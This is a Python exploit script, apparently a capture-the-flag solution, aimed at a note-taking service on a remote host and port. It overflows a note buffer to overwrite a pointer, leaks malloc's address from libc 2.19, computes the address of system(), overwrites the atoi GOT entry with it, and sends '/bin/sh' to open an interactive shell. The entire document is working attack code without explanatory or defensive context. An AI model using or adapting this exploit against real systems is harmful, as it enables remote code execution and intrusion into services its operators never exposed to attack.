from zio import *
from pwn import *
#target = "./note1"
target = ("115.28.27.103", 9001)

def get_io(target):
	r_m = COLORED(RAW, "green")
	w_m = COLORED(RAW, "blue")
	io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
	return  io 

def new_note(io, title_t, type_t, content_t):
	io.read_until("option--->>\n")
	io.writeline("1")
	io.read_until("title:\n")
	io.writeline(title_t)
	io.read_until("type:\n")
	io.writeline(type_t)
	io.read_until("content:\n")
	io.writeline(content_t)

def show_note(io):
	io.read_until("option--->>\n")
	io.writeline("2")

def edit_note(io, title_t, content_t):
	io.read_until("option--->>\n")
	io.writeline("3")
	io.read_until("title:\n")
	io.writeline(title_t)
	io.read_until("content:\n")
	io.writeline(content_t)

def pwn(io):
	new_note(io, 'aaa', 'aaa', 'aaa')
	new_note(io, 'bbb', 'bbb', 'bbb')
	new_note(io, 'ccc', 'ccc', 'ccc')
	show_note(io)

	atoi_got = 0x0000000000602068 - 0x80

	content= 'a' * 256 + l64(0x01) + l64(0x01) + l64(0x01) + l64(atoi_got) + "bbb"
	
	io.gdb_hint()
	edit_note(io, 'aaa', content)

	show_note(io)
	io.read_until("title=, type=, content=")
	data = io.read_until("\n")[:-1]
	print [c for c in data]
	data = data.ljust(8, '\x00')
	malloc_addr = l64(data)
	print "malloc_addr:", hex(malloc_addr)

	elf_info = ELF("./libc-2.19.so")
	malloc_offset = elf_info.symbols["malloc"]
	system_offset = elf_info.symbols["system"]

	libc_base = malloc_addr - malloc_offset
	system_addr = libc_base + system_offset

	content = "a" * 16 + l64(system_addr)

	print "system_addr:", hex(system_addr)
	edit_note(io, "", content)
	io.read_until("option--->>\n")
	io.writeline("/bin/sh")
	io.interact()

io = get_io(target)
pwn(io)

